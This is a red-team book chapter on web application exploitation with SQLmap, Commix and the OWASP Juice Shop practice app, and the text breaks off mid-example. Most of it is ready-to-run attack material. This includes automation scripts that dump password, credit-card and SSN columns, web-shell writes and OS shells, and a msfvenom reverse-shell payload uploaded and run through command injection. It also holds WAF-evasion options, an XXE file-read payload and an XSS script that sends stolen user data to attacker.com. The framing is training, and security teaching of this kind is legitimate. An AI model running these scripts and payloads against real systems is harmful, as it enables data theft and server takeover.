# Chapter 10: Web Application Exploitation

Web applications represent some of the most accessible and vulnerable attack surfaces in modern organizations. As businesses continue to expand their web presence, red teams must be proficient in identifying and exploiting web application vulnerabilities to demonstrate the real-world impact of insecure development practices. This chapter explores specialized tools for web application exploitation available in Kali and Parrot OS, focusing on practical techniques for identifying and leveraging common vulnerabilities.

## SQLmap: SQL Injection Mastery

SQL injection remains one of the most devastating web application vulnerabilities, potentially allowing attackers to access, modify, or delete sensitive database information. SQLmap is a powerful open-source tool specifically designed to automate the detection and exploitation of SQL injection vulnerabilities.

### Installation and Basic Setup

SQLmap comes pre-installed on Kali and Parrot OS, but you can ensure you have the latest version:

```bash
# Update system
apt update

# Install SQLmap if not already installed
apt install sqlmap -y

# Alternatively, get the latest version from the repository
git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev
cd sqlmap-dev
```

### Basic Usage

The simplest form of SQLmap usage targets a specific URL:

```bash
sqlmap -u "http://vulnerable-site.com/page.php?id=1"
```

This command tests the `id` parameter for SQL injection vulnerabilities using default settings.

### Detection Techniques

SQLmap employs several techniques to detect SQL injection vulnerabilities:

#### Boolean-based Blind

```bash
sqlmap -u "http://vulnerable-site.com/page.php?id=1" --technique=B
```

This technique infers results based on TRUE/FALSE conditions, working even when there is no visible output from the database.

#### Time-based Blind

```bash
sqlmap -u "http://vulnerable-site.com/page.php?id=1" --technique=T
```

Time-based blind injections rely on the database pausing for a specified amount of time to infer results.

#### Error-based

```bash
sqlmap -u "http://vulnerable-site.com/page.php?id=1" --technique=E
```

Error-based techniques extract data through error messages generated by the database.

#### Union-based

```bash
sqlmap -u "http://vulnerable-site.com/page.php?id=1" --technique=U
```

UNION-based attacks leverage the SQL UNION operator to combine results from injected queries with legitimate queries.

#### Stacked Queries

```bash
sqlmap -u "http://vulnerable-site.com/page.php?id=1" --technique=S
```

This technique uses database-specific features to stack multiple SQL statements in a single request.

### Target Specification

SQLmap offers multiple ways to specify targets:

#### Direct URL

```bash
sqlmap -u "http://vulnerable-site.com/page.php?id=1"
```

#### Request File

Save an HTTP request to a file using a proxy like Burp Suite, then use it with SQLmap:

```bash
sqlmap -r request.txt
```

#### Burp Suite Integration

Directly use a request from Burp Suite's history or intruder:

```bash
# Export the request from Burp to a file, then:
sqlmap -r burp_request.txt
```

### Database Enumeration and Extraction

Once a vulnerability is found, SQLmap can extract valuable information:

#### Database Version

```bash
sqlmap -u "http://vulnerable-site.com/page.php?id=1" --banner
```

#### List Databases

```bash
sqlmap -u "http://vulnerable-site.com/page.php?id=1" --dbs
```

#### List Tables in a Database

```bash
sqlmap -u "http://vulnerable-site.com/page.php?id=1" -D database_name --tables
```

#### List Columns in a Table

```bash
sqlmap -u "http://vulnerable-site.com/page.php?id=1" -D database_name -T table_name --columns
```

#### Dump Table Contents

```bash
sqlmap -u "http://vulnerable-site.com/page.php?id=1" -D database_name -T table_name -C column1,column2 --dump
```

### Advanced Techniques

#### Bypassing WAF/IPS

Web Application Firewalls (WAFs) and Intrusion Prevention Systems (IPS) often try to block SQL injection attempts. SQLmap includes various evasion techniques:

```bash
# Use tamper scripts to modify the payload
sqlmap -u "http://vulnerable-site.com/page.php?id=1" --tamper=space2comment,between

# Try alternative techniques with custom delimiters
sqlmap -u "http://vulnerable-site.com/page.php?id=1" --technique=BT --time-sec=10 --hex --no-cast
```

#### Automating Multi-Parameter Testing

To test all parameters in a URL automatically:

```bash
sqlmap -u "http://vulnerable-site.com/page.php?id=1&cat=2&user=3" --batch --level=5 --risk=3
```

#### File System Access

SQLmap can interact with the server's file system if the database has appropriate privileges:

```bash
# Read a file
sqlmap -u "http://vulnerable-site.com/page.php?id=1" --file-read=/etc/passwd

# Write a file (e.g., a web shell)
sqlmap -u "http://vulnerable-site.com/page.php?id=1" --file-write=shell.php --file-dest=/var/www/html/shell.php
```

#### Command Execution

For databases with appropriate privileges, SQLmap can execute operating system commands:

```bash
sqlmap -u "http://vulnerable-site.com/page.php?id=1" --os-shell
```

### SQLmap Automation Script

This script automates a thorough SQL injection assessment process:

```bash
#!/bin/bash
# sqlmap_comprehensive.sh - Comprehensive SQL injection assessment

# Target configuration
TARGET_URL=$1
OUTPUT_DIR="sqlmap_results_$(date +%Y%m%d_%H%M%S)"
RISK_LEVEL=2
THREADS=5
USER_AGENT="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"

# Check if a target was provided
if [ -z "$TARGET_URL" ]; then
  echo "Usage: $0 <target_url>"
  echo "Example: $0 'http://vulnerable-site.com/page.php?id=1'"
  exit 1
fi

# Create output directory
mkdir -p "$OUTPUT_DIR"
echo "Results will be saved to $OUTPUT_DIR"

# Function to log and execute sqlmap commands
run_sqlmap() {
  local description=$1
  local command=$2
  local output_file="$OUTPUT_DIR/$(echo "$description" | sed 's/ /_/g').txt"
  
  echo "[$description]"
  echo "Command: $command"
  echo "Output file: $output_file"
  
  # Execute the command and capture output
  $command | tee "$output_file"
  
  echo "-------------------------------------------"
}

# Phase 1: Initial Detection
echo "[+] Starting initial SQL injection detection"
run_sqlmap "Initial Detection" "sqlmap -u \"$TARGET_URL\" --batch --random-agent --threads=$THREADS --level=1 --risk=$RISK_LEVEL -v 1 --output-dir=$OUTPUT_DIR"

# Check if vulnerable
if grep -q "is vulnerable" "$OUTPUT_DIR/log"; then
  echo "[+] Target is vulnerable to SQL injection! Proceeding with exploitation."
else
  echo "[-] No straightforward SQL injection vulnerability detected. Trying advanced options."
  # Increase level and risk, try different techniques
  run_sqlmap "Advanced Detection" "sqlmap -u \"$TARGET_URL\" --batch --random-agent --threads=$THREADS --level=5 --risk=3 --tamper=space2comment,between,charencode -v 1 --output-dir=$OUTPUT_DIR"
  
  # Check again if vulnerable
  if ! grep -q "is vulnerable" "$OUTPUT_DIR/log"; then
    echo "[-] Target does not appear to be vulnerable to SQL injection. Exiting."
    exit 0
  fi
fi

# Phase 2: Database Enumeration
echo "[+] Enumerating database information"
run_sqlmap "Database Banner" "sqlmap -u \"$TARGET_URL\" --batch --random-agent --banner --threads=$THREADS --output-dir=$OUTPUT_DIR"
run_sqlmap "Current User" "sqlmap -u \"$TARGET_URL\" --batch --random-agent --current-user --threads=$THREADS --output-dir=$OUTPUT_DIR"
run_sqlmap "Current DB" "sqlmap -u \"$TARGET_URL\" --batch --random-agent --current-db --threads=$THREADS --output-dir=$OUTPUT_DIR"
run_sqlmap "List Databases" "sqlmap -u \"$TARGET_URL\" --batch --random-agent --dbs --threads=$THREADS --output-dir=$OUTPUT_DIR"

# Extract current database from output
CURRENT_DB=$(grep -A 1 "current database" "$OUTPUT_DIR/Current_DB.txt" | tail -n 1 | awk '{print $1}')

if [ -z "$CURRENT_DB" ]; then
  echo "[-] Could not determine current database. Please specify manually:"
  read -p "Database name: " CURRENT_DB
fi

echo "[+] Using database: $CURRENT_DB"

# Phase 3: Table Enumeration
echo "[+] Enumerating tables in $CURRENT_DB"
run_sqlmap "List Tables" "sqlmap -u \"$TARGET_URL\" --batch --random-agent -D $CURRENT_DB --tables --threads=$THREADS --output-dir=$OUTPUT_DIR"

# Extract interesting tables
TABLES_FILE="$OUTPUT_DIR/interesting_tables.txt"
grep -A 100 "tables for database" "$OUTPUT_DIR/List_Tables.txt" | grep "|" | grep -v "Table" | awk '{print $2}' > "$TABLES_FILE"

# Look for interesting tables
INTERESTING_TABLES=()
for pattern in "user" "admin" "account" "member" "customer" "client" "auth" "permission" "credential" "login" "session" "token" "key" "secret" "config" "setting"; do
  grep -i "$pattern" "$TABLES_FILE" >> "$OUTPUT_DIR/priority_tables.txt"
done

if [ -s "$OUTPUT_DIR/priority_tables.txt" ]; then
  INTERESTING_TABLES=($(cat "$OUTPUT_DIR/priority_tables.txt" | sort | uniq))
else
  # If no interesting tables found, use all tables (up to 5)
  INTERESTING_TABLES=($(head -n 5 "$TABLES_FILE"))
fi

# Phase 4: Column Enumeration and Data Extraction
for table in "${INTERESTING_TABLES[@]}"; do
  echo "[+] Examining table: $table"
  
  # Get columns
  run_sqlmap "Columns in $table" "sqlmap -u \"$TARGET_URL\" --batch --random-agent -D $CURRENT_DB -T $table --columns --threads=$THREADS --output-dir=$OUTPUT_DIR"
  
  # Look for sensitive columns
  COLUMNS_FILE="$OUTPUT_DIR/sensitive_columns_${table}.txt"
  grep -A 100 "columns for table" "$OUTPUT_DIR/Columns_in_${table}.txt" | grep "|" | grep -v "Column" | awk '{print $2}' > "$COLUMNS_FILE"
  
  SENSITIVE_COLUMNS=()
  for pattern in "id" "name" "user" "username" "login" "pass" "password" "hash" "email" "mail" "address" "phone" "credit" "card" "token" "key" "secret" "ssn" "social" "admin" "permission" "role"; do
    grep -i "$pattern" "$COLUMNS_FILE" >> "$OUTPUT_DIR/priority_columns_${table}.txt"
  done
  
  if [ -s "$OUTPUT_DIR/priority_columns_${table}.txt" ]; then
    COLUMNS=$(cat "$OUTPUT_DIR/priority_columns_${table}.txt" | sort | uniq | tr '\n' ',' | sed 's/,$//')
  else
    # If no sensitive columns found, use all columns
    COLUMNS=$(cat "$COLUMNS_FILE" | tr '\n' ',' | sed 's/,$//')
  fi
  
  # Dump data from table
  echo "[+] Dumping data from table $table (columns: $COLUMNS)"
  run_sqlmap "Dump $table" "sqlmap -u \"$TARGET_URL\" --batch --random-agent -D $CURRENT_DB -T $table -C $COLUMNS --dump --threads=$THREADS --output-dir=$OUTPUT_DIR"
done

# Phase 5: Advanced Exploitation (optional)
echo "[+] Checking for advanced exploitation possibilities"

# Check for file system access
run_sqlmap "File Read Check" "sqlmap -u \"$TARGET_URL\" --batch --random-agent --file-read=/etc/passwd --threads=$THREADS --output-dir=$OUTPUT_DIR"

# Check for OS shell
if grep -q "the target is" "$OUTPUT_DIR/File_Read_Check.txt"; then
  echo "[!] Target appears to allow file system access. You may want to manually try:"
  echo "    sqlmap -u \"$TARGET_URL\" --file-read=/etc/passwd"
  echo "    sqlmap -u \"$TARGET_URL\" --os-shell"
fi

# Summary report
echo "[+] Creating summary report"
{
  echo "SQL Injection Assessment Summary"
  echo "================================"
  echo ""
  echo "Target URL: $TARGET_URL"
  echo "Date: $(date)"
  echo ""
  echo "Vulnerability Status:"
  if grep -q "is vulnerable" "$OUTPUT_DIR/log"; then
    echo "✓ SQL Injection vulnerability confirmed"
    grep -A 2 "vulnerable to " "$OUTPUT_DIR/log" | grep -v "testing " | sed 's/\[.\]/    /'
  else
    echo "✗ No SQL Injection vulnerability definitively confirmed"
  fi
  echo ""
  echo "Database Information:"
  echo "- Type: $(grep -A 1 "back-end DBMS" "$OUTPUT_DIR/Database_Banner.txt" | tail -n 1)"
  echo "- Current User: $(grep -A 1 "current user" "$OUTPUT_DIR/Current_User.txt" | tail -n 1)"
  echo "- Current Database: $CURRENT_DB"
  echo ""
  echo "Interesting Tables Examined:"
  for table in "${INTERESTING_TABLES[@]}"; do
    echo "- $table"
  done
  echo ""
  echo "Sensitive Data Extracted:"
  echo "See individual dump files in $OUTPUT_DIR/dump/"
  echo ""
  echo "Advanced Exploitation:"
  if grep -q "the target is" "$OUTPUT_DIR/File_Read_Check.txt"; then
    echo "✓ Target may allow file system access or command execution"
  else
    echo "✗ No evidence of file system access or command execution capability"
  fi
} > "$OUTPUT_DIR/summary_report.txt"

echo "[+] Assessment complete! Summary saved to $OUTPUT_DIR/summary_report.txt"
```

To use this script:

```bash
chmod +x sqlmap_comprehensive.sh
./sqlmap_comprehensive.sh "http://vulnerable-site.com/page.php?id=1"
```

### Example: Extracting Sensitive Data Through Blind SQLi

During a red team assessment for an e-commerce company, we encountered a product search page that was vulnerable to blind SQL injection. Here's how we exploited it:

1. **Initial Discovery**:
   - Noticed unexpected behavior when adding single quotes to search terms
   - Confirmed vulnerability using time-based techniques:

   ```bash
   # Initial test that caused a delay in response
   sqlmap -u "https://target-shop.com/search?term=product" --technique=T --time-sec=10
   ```

2. **Database Enumeration**:
   ```bash
   # Identified the database type (MySQL) and version
   sqlmap -u "https://target-shop.com/search?term=product" --banner
   
   # Enumerated available databases
   sqlmap -u "https://target-shop.com/search?term=product" --dbs
   
   # Found interesting database: shop_prod
   sqlmap -u "https://target-shop.com/search?term=product" -D shop_prod --tables
   ```

3. **Targeted Extraction**:
   ```bash
   # Discovered user_accounts table
   sqlmap -u "https://target-shop.com/search?term=product" -D shop_prod -T user_accounts --columns
   
   # Extracted sensitive customer data
   sqlmap -u "https://target-shop.com/search?term=product" -D shop_prod -T user_accounts -C id,username,email,password,credit_card_number --dump
   ```

4. **Optimization for Production Systems**:
   Due to the blind nature of the injection and production environment constraints, we optimized our approach:
   ```bash
   # Used specific techniques with careful timing to avoid impacting the service
   sqlmap -u "https://target-shop.com/search?term=product" -D shop_prod -T user_accounts -C username,password --threads=2 --time-sec=2 --technique=T --hex --no-cast --batch
   ```

5. **Findings and Impact**:
   - Extracted 1,000+ customer records with hashed passwords
   - Identified several MD5-hashed admin passwords that could be cracked
   - Demonstrated full database access without triggering security alarms

This example showcases how even a blind SQL injection vulnerability can lead to significant data exposure when properly exploited, highlighting the importance of proper input validation and parameterized queries.

## Commix: Command Injection Exploiter

Command injection vulnerabilities occur when user input is improperly sanitized before being used in system commands. Commix (COMMand Injection eXploiter) is a specialized tool for detecting and exploiting command injection flaws in web applications.

### Installation

Commix comes pre-installed on Kali Linux and Parrot OS, but you can ensure you have the latest version:

```bash
# Update system
apt update

# Install Commix if not already installed
apt install commix -y

# Alternatively, get the latest version from GitHub
git clone https://github.com/commixproject/commix.git
cd commix
```

### Basic Usage

The simplest form of Commix usage targets a specific URL parameter:

```bash
python commix.py -u "http://vulnerable-site.com/search.php?cmd=query"
```

### Detection and Exploitation Modes

Commix supports different modes for detecting and exploiting command injection vulnerabilities:

#### Classic Mode (Default)

Attempts standard command injection techniques:

```bash
python commix.py -u "http://vulnerable-site.com/search.php?cmd=query"
```

#### Shell Mode

Provides an interactive pseudo-terminal when a vulnerability is found:

```bash
python commix.py -u "http://vulnerable-site.com/search.php?cmd=query" --shell
```

#### Semi-Blind Mode

For cases where command output is not directly visible:

```bash
python commix.py -u "http://vulnerable-site.com/search.php?cmd=query" --technique=semiblind
```

#### Time-Based Blind Mode

Relies on time delays to confirm command execution:

```bash
python commix.py -u "http://vulnerable-site.com/search.php?cmd=query" --technique=time-based
```

### Working with Different HTTP Methods

Commix supports various HTTP methods for testing parameters:

#### GET Requests

```bash
python commix.py -u "http://vulnerable-site.com/search.php?cmd=query"
```

#### POST Requests

```bash
python commix.py -u "http://vulnerable-site.com/search.php" --data="cmd=query"
```

#### Cookie Injection

```bash
python commix.py -u "http://vulnerable-site.com/search.php" --cookie="PHPSESSID=1234; cmd=query"
```

#### HTTP Headers

```bash
python commix.py -u "http://vulnerable-site.com/search.php" --headers="User-Agent:Mozilla/5.0;Referer:http://example.com;cmd=query"
```

### Bypassing Security Mechanisms

#### WAF Bypass

```bash
python commix.py -u "http://vulnerable-site.com/search.php?cmd=query" --tamper=space2ifs
```

#### Obfuscation Techniques

```bash
python commix.py -u "http://vulnerable-site.com/search.php?cmd=query" --prefix="'" --suffix="'" --technique=classic
```

#### Custom Separators

```bash
python commix.py -u "http://vulnerable-site.com/search.php?cmd=query" --separator="||"
```

### Advanced Exploitation

#### File Upload

```bash
python commix.py -u "http://vulnerable-site.com/search.php?cmd=query" --file-upload="/path/to/local/file" --file-dest="/path/to/remote/file"
```

#### Reverse Shell

```bash
python commix.py -u "http://vulnerable-site.com/search.php?cmd=query" --reverse-tcp 10.0.0.1 4444
```

### Commix Automation Script

This script automates a thorough command injection assessment process:

```bash
#!/bin/bash
# commix_comprehensive.sh - Comprehensive command injection assessment

# Target configuration
TARGET_URL=$1
OUTPUT_DIR="commix_results_$(date +%Y%m%d_%H%M%S)"
TECHNIQUES="classic,eval-based,time-based,file-based,tempfile-based"
LISTEN_IP="10.0.0.5"  # Change to your IP
LISTEN_PORT="4444"
USER_AGENT="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"

# Check if a target was provided
if [ -z "$TARGET_URL" ]; then
  echo "Usage: $0 <target_url>"
  echo "Example: $0 'http://vulnerable-site.com/search.php?cmd=query'"
  exit 1
fi

# Create output directory
mkdir -p "$OUTPUT_DIR"
echo "Results will be saved to $OUTPUT_DIR"

# Function to log and execute commix commands
run_commix() {
  local description=$1
  local command=$2
  local output_file="$OUTPUT_DIR/$(echo "$description" | sed 's/ /_/g').txt"
  
  echo "[$description]"
  echo "Command: $command"
  echo "Output file: $output_file"
  
  # Execute the command and capture output
  $command | tee "$output_file"
  
  echo "-------------------------------------------"
}

# Phase 1: Initial Detection with all techniques
echo "[+] Starting initial command injection detection"
run_commix "Initial Detection" "python3 /usr/bin/commix -u \"$TARGET_URL\" --batch --random-agent --techniques=$TECHNIQUES --output-dir=$OUTPUT_DIR"

# Check if vulnerable
if grep -q "Payload: " "$OUTPUT_DIR/Initial_Detection.txt"; then
  echo "[+] Target is vulnerable to command injection! Proceeding with exploitation."
else
  echo "[-] No straightforward command injection vulnerability detected. Trying advanced options."
  
  # Try with different HTTP methods
  run_commix "POST Method Test" "python3 /usr/bin/commix -u \"$TARGET_URL\" --data=\"$(echo $TARGET_URL | cut -d '?' -f2)\" --batch --techniques=$TECHNIQUES --output-dir=$OUTPUT_DIR"
  
  # Try cookie-based injection
  run_commix "Cookie Injection Test" "python3 /usr/bin/commix -u \"$TARGET_URL\" --cookie=\"cmd=$(echo $TARGET_URL | grep -o 'cmd=.*' | cut -d '=' -f2)\" --batch --techniques=$TECHNIQUES --output-dir=$OUTPUT_DIR"
  
  # Try header-based injection
  run_commix "Header Injection Test" "python3 /usr/bin/commix -u \"$TARGET_URL\" --headers=\"User-Agent:$(echo $TARGET_URL | grep -o 'cmd=.*' | cut -d '=' -f2)\" --batch --techniques=$TECHNIQUES --output-dir=$OUTPUT_DIR"
  
  # Check if any of these tests were successful
  if ! grep -q "Payload: " "$OUTPUT_DIR"/*.txt; then
    echo "[-] Target does not appear to be vulnerable to command injection using basic techniques."
    echo "[*] Trying with WAF bypass techniques..."
    
    # Try with WAF bypass
    for tamper in "space2ifs" "space2tab" "base64encode" "hexencode"; do
      run_commix "WAF Bypass ($tamper)" "python3 /usr/bin/commix -u \"$TARGET_URL\" --tamper=$tamper --batch --techniques=$TECHNIQUES --output-dir=$OUTPUT_DIR"
      
      if grep -q "Payload: " "$OUTPUT_DIR/WAF_Bypass_${tamper}.txt"; then
        echo "[+] Found vulnerability using $tamper tamper script!"
        break
      fi
    done
    
    # If still not vulnerable, try with custom prefixes and suffixes
    if ! grep -q "Payload: " "$OUTPUT_DIR"/*.txt; then
      for prefix in "'" "\"" "`" "$("; do
        for suffix in "'" "\"" "`" ")"; do
          run_commix "Custom Delimiters ($prefix$suffix)" "python3 /usr/bin/commix -u \"$TARGET_URL\" --prefix=\"$prefix\" --suffix=\"$suffix\" --batch --techniques=$TECHNIQUES --output-dir=$OUTPUT_DIR"
          
          if grep -q "Payload: " "$OUTPUT_DIR/Custom_Delimiters_${prefix}${suffix}.txt"; then
            echo "[+] Found vulnerability using $prefix$suffix delimiters!"
            break 2
          fi
        done
      done
    fi
  fi
fi

# Final check if vulnerable
if ! grep -q "Payload: " "$OUTPUT_DIR"/*.txt; then
  echo "[-] Target does not appear to be vulnerable to command injection. Exiting."
  exit 0
fi

# Phase 2: Environment Information Gathering
echo "[+] Gathering environment information"

# Extract the working payload from the successful test
PAYLOAD=$(grep -m 1 "Payload: " "$OUTPUT_DIR"/*.txt | sed 's/.*Payload: //')
VULNERABLE_URL=$(grep -m 1 "URL: " "$OUTPUT_DIR"/*.txt | sed 's/.*URL: //')
TECHNIQUE=$(grep -m 1 "Technique: " "$OUTPUT_DIR"/*.txt | sed 's/.*Technique: //')

echo "[*] Using payload: $PAYLOAD"
echo "[*] Vulnerable URL: $VULNERABLE_URL"
echo "[*] Effective technique: $TECHNIQUE"

# Gather environment information
run_commix "OS Information" "python3 /usr/bin/commix -u \"$VULNERABLE_URL\" --os-cmd=\"uname -a\" --batch --techniques=$TECHNIQUE --output-dir=$OUTPUT_DIR"
run_commix "User Information" "python3 /usr/bin/commix -u \"$VULNERABLE_URL\" --os-cmd=\"id\" --batch --techniques=$TECHNIQUE --output-dir=$OUTPUT_DIR"
run_commix "Network Information" "python3 /usr/bin/commix -u \"$VULNERABLE_URL\" --os-cmd=\"ifconfig || ip addr\" --batch --techniques=$TECHNIQUE --output-dir=$OUTPUT_DIR"
run_commix "Directory Information" "python3 /usr/bin/commix -u \"$VULNERABLE_URL\" --os-cmd=\"pwd; ls -la\" --batch --techniques=$TECHNIQUE --output-dir=$OUTPUT_DIR"

# Phase 3: Interactive Shell (if viable)
if [[ "$TECHNIQUE" != *"blind"* ]]; then
  echo "[+] Starting interactive shell session"
  echo "[*] Press Ctrl+C to exit the shell when done"
  echo "[*] Command results will be saved to $OUTPUT_DIR/Interactive_Shell.txt"
  run_commix "Interactive Shell" "python3 /usr/bin/commix -u \"$VULNERABLE_URL\" --shell --batch --techniques=$TECHNIQUE --output-dir=$OUTPUT_DIR"
else
  echo "[-] Interactive shell not recommended for blind injection. Try reverse shell instead."
fi

# Phase 4: Attempt Reverse Shell
echo "[+] Would you like to attempt a reverse shell? (y/n)"
read -p "> " REVERSE_SHELL

if [[ "$REVERSE_SHELL" == "y" || "$REVERSE_SHELL" == "Y" ]]; then
  echo "[*] Setting up listener on $LISTEN_IP:$LISTEN_PORT"
  echo "[*] Start a netcat listener in another terminal with: nc -lvnp $LISTEN_PORT"
  echo "[*] Press Enter when your listener is ready..."
  read
  
  run_commix "Reverse Shell" "python3 /usr/bin/commix -u \"$VULNERABLE_URL\" --reverse-tcp $LISTEN_IP $LISTEN_PORT --batch --techniques=$TECHNIQUE --output-dir=$OUTPUT_DIR"
fi

# Phase 5: File Operations (if desired)
echo "[+] Would you like to test file operations? (y/n)"
read -p "> " FILE_OPS

if [[ "$FILE_OPS" == "y" || "$FILE_OPS" == "Y" ]]; then
  echo "[*] Creating a test file to upload"
  echo "This is a test file created by commix_comprehensive.sh" > "$OUTPUT_DIR/test_upload.txt"
  
  echo "[*] Attempting to upload test file"
  run_commix "File Upload" "python3 /usr/bin/commix -u \"$VULNERABLE_URL\" --file-upload=\"$OUTPUT_DIR/test_upload.txt\" --file-dest=\"/tmp/test_upload.txt\" --batch --techniques=$TECHNIQUE --output-dir=$OUTPUT_DIR"
  
  echo "[*] Verifying uploaded file"
  run_commix "File Verification" "python3 /usr/bin/commix -u \"$VULNERABLE_URL\" --os-cmd=\"cat /tmp/test_upload.txt\" --batch --techniques=$TECHNIQUE --output-dir=$OUTPUT_DIR"
fi

# Summary report
echo "[+] Creating summary report"
{
  echo "Command Injection Assessment Summary"
  echo "===================================="
  echo ""
  echo "Target URL: $TARGET_URL"
  echo "Date: $(date)"
  echo ""
  echo "Vulnerability Status:"
  if grep -q "Payload: " "$OUTPUT_DIR"/*.txt; then
    echo "✓ Command injection vulnerability confirmed"
    echo "  - Technique: $TECHNIQUE"
    echo "  - Working payload: $PAYLOAD"
  else
    echo "✗ No command injection vulnerability definitively confirmed"
  fi
  echo ""
  echo "Environment Information:"
  echo "- OS: $(grep -A 3 "uname -a" "$OUTPUT_DIR/OS_Information.txt" | tail -n 1)"
  echo "- User: $(grep -A 3 "id" "$OUTPUT_DIR/User_Information.txt" | tail -n 1)"
  echo "- Directory: $(grep -A 3 "pwd" "$OUTPUT_DIR/Directory_Information.txt" | tail -n 1)"
  echo ""
  echo "Exploitation Results:"
  if [[ -f "$OUTPUT_DIR/Interactive_Shell.txt" ]]; then
    echo "✓ Interactive shell session established"
  fi
  if [[ -f "$OUTPUT_DIR/Reverse_Shell.txt" ]]; then
    echo "✓ Reverse shell attempt made"
  fi
  if [[ -f "$OUTPUT_DIR/File_Upload.txt" ]]; then
    if grep -q "successfully uploaded" "$OUTPUT_DIR/File_Upload.txt"; then
      echo "✓ File upload successful"
    else
      echo "✗ File upload failed"
    fi
  fi
  echo ""
  echo "Recommendations:"
  echo "1. Implement proper input validation and sanitization"
  echo "2. Use parameterized commands instead of direct command execution"
  echo "3. Apply the principle of least privilege for the web application user"
  echo "4. Consider using application firewalls with command injection signatures"
} > "$OUTPUT_DIR/summary_report.txt"

echo "[+] Assessment complete! Summary saved to $OUTPUT_DIR/summary_report.txt"
```

To use this script:

```bash
chmod +x commix_comprehensive.sh
./commix_comprehensive.sh "http://vulnerable-site.com/search.php?cmd=query"
```

### Example: Gaining Shell Access Through Injection Flaws

During a red team assessment for a technology company, we discovered a custom monitoring application that allowed administrators to ping hosts through a web interface. This feature contained a command injection vulnerability that we exploited:

1. **Initial Discovery**:
   - Identified a ping utility at `http://monitoring.internal.corp/tools/ping.php?host=192.168.1.1`
   - Testing for command injection by adding command separators:

   ```bash
   # Initial test with semicolon
   commix -u "http://monitoring.internal.corp/tools/ping.php?host=192.168.1.1;id"
   ```

2. **Vulnerability Confirmation**:
   ```bash
   # Confirmed the vulnerability using commix
   commix -u "http://monitoring.internal.corp/tools/ping.php?host=192.168.1.1" --batch --techniques=classic
   
   # Commix found the vulnerability and identified the injection point
   ```

3. **Environment Enumeration**:
   ```bash
   # Gathered basic system information
   commix -u "http://monitoring.internal.corp/tools/ping.php?host=192.168.1.1" --os-cmd="uname -a; whoami; id"
   
   # Discovered we were running as www-data on an Ubuntu server
   ```

4. **Privilege Escalation Reconnaissance**:
   ```bash
   # Checked for potential privilege escalation paths
   commix -u "http://monitoring.internal.corp/tools/ping.php?host=192.168.1.1" --os-cmd="find / -perm -u=s -type f 2>/dev/null"
   
   # Found that the ping utility itself had the SUID bit set
   ```

5. **Establishing Persistent Access**:
   ```bash
   # Created a reverse shell payload
   msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.0.0.5 LPORT=4444 -f elf > shell.elf
   
   # Set up a netcat listener on our attack box
   nc -lvnp 4444
   
   # Used commix to upload and execute the payload
   commix -u "http://monitoring.internal.corp/tools/ping.php?host=192.168.1.1" --file-upload=shell.elf --file-dest=/tmp/shell.elf
   commix -u "http://monitoring.internal.corp/tools/ping.php?host=192.168.1.1" --os-cmd="chmod +x /tmp/shell.elf; /tmp/shell.elf"
   ```

6. **Privilege Escalation via SUID Binary**:
   With our reverse shell established, we leveraged the SUID ping binary to escalate privileges to root, demonstrating the full impact of the command injection vulnerability.

This example illustrates how a seemingly innocuous feature like a ping utility can be exploited through command injection to gain complete control of a server, highlighting the importance of proper input validation and command sanitization.

## OWASP Juice Shop: Practice Environment

OWASP Juice Shop is a deliberately vulnerable web application that serves as an excellent practice environment for web application exploitation techniques. It includes common vulnerabilities from the OWASP Top 10 and beyond, making it ideal for red team training.

### Installation and Setup

```bash
# Clone the repository
git clone https://github.com/bkimminich/juice-shop.git
cd juice-shop

# Install dependencies
npm install

# Start the application
npm start
```

Alternatively, you can use Docker:

```bash
docker pull bkimminich/juice-shop
docker run -d -p 3000:3000 bkimminich/juice-shop
```

The application will be available at http://localhost:3000.

### Key Vulnerabilities to Exploit

OWASP Juice Shop includes numerous vulnerabilities for practice. Here are some of the most important ones for red teamers:

#### 1. SQL Injection

The login form is vulnerable to SQL injection:

```bash
# Using SQLmap
sqlmap -u "http://localhost:3000/rest/user/login" --data="email=test@test.com&password=test" -p email --dbms=sqlite --level=5 --risk=3
```

Manual exploitation:
- Email: `' OR 1=1--`
- Password: anything

#### 2. Broken Authentication

Password reset functionality contains vulnerabilities:

```bash
# Intercept the password reset request in Burp Suite
# Modify the request to target another user's account
```

#### 3. Sensitive Data Exposure

The application contains Easter eggs with sensitive information:

```bash
# View source code for hidden comments
# Check for sensitive files in robots.txt
curl http://localhost:3000/robots.txt
```

#### 4. XML External Entity (XXE) Processing

The application allows file uploads that can be used for XXE attacks:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///etc/passwd" >
]>
<foo>&xxe;</foo>
```

#### 5. Broken Access Controls

The application has numerous access control issues:

```bash
# Access admin areas without proper authentication
# Modify the user ID in requests to access other user accounts
```

#### 6. Cross-Site Scripting (XSS)

Several XSS vulnerabilities exist in the application:

```javascript
<script>alert(document.cookie)</script>
```

### Example: Real-World Exploitation Techniques

Here's a walkthrough of exploiting multiple vulnerabilities in Juice Shop to achieve admin access:

1. **Reconnaissance**:
   ```bash
   # Explore the application
   dirb http://localhost:3000
   
   # Check for hidden endpoints
   curl http://localhost:3000/robots.txt
   
   # Discovered /ftp directory with potential sensitive files
   ```

2. **Initial Access via SQL Injection**:
   ```bash
   # Login with SQL injection
   # Username: ' OR 1=1--
   # Password: anything
   
   # Now logged in as the first user in the database
   ```

3. **Privilege Escalation via Broken Access Control**:
   ```bash
   # Intercept requests in Burp Suite
   # Notice user information is fetched from /api/Users/<id>
   
   # Enumerate users by trying different IDs
   curl http://localhost:3000/api/Users/1
   curl http://localhost:3000/api/Users/2
   
   # Found admin user at ID 1
   ```

4. **Session Hijacking via XSS**:
   ```javascript
   # Post a product review with XSS payload
   <script>
   fetch('/api/Users/1')
     .then(response => response.json())
     .then(data => {
       fetch('http://attacker.com/steal?data=' + btoa(JSON.stringify(data)))
     });
   </script>
   
   # Set up a listener on attacker.com to receive the data
   nc -lvnp 80
   ```

5. **Password Reset Attack**:
   ```bash
   # Use the security questions found in the admin profile
   # Reset admin password using known answers
   
   # Login as admin with new password
   ```

6. **Data Exfiltration via XXE**:
   ```bash
   # Create an XML file with XXE payload
   <?xml version="1.0" encoding="UTF-8"?>
   <!DOCTYPE foo [
     <!ELEMENT foo ANY >
